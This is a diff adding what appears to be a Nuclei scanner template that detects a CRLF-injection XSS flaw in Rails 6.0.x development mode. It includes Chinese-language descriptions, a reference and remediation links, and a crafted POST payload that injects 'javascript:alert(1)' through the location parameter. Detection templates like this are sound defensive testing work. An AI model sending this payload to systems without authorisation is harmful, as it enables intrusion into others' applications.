@@ -1,0 +1,40 @@
+id: rails6-xss
+info:
+  name: Rails CRLF XSS (6.0.0 < rails < 6.0.3.2)
+  author:
+  - l0ne1y
+  tags:
+  - rails
+  - xss
+  - crlf
+  description: |-
+    Rails ＞= 6.0.0 CRLF注入导致跨站脚本漏洞
+    Rails是Rails团队的一套基于Ruby语言的开源Web应用框架。
+
+    Rails ＞= 6.0.0版本中存在跨站脚本漏洞。当应用程序运行在开发模式时，可能存在XSS漏洞，允许攻击者发送或嵌入(在另一个页面中)一个特别制作的URL，从而允许攻击者在本地应用程序的上下文中执行Javascript。
+  reference:
+  - https://hackerone.com/reports/904059
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
+    https://groups.google.com/g/rubyonrails-security/c/yQzUVfv42jk/m/oJWw-xhNAQAJ?pli=1
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - javascript:alert(1)
+  - type: status
+    status:
+    - 302
+  - type: word
+    condition: and
+    part: header
+    words:
+    - 'Location: aaaaa'
+    - text/html
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa'
+  method: POST
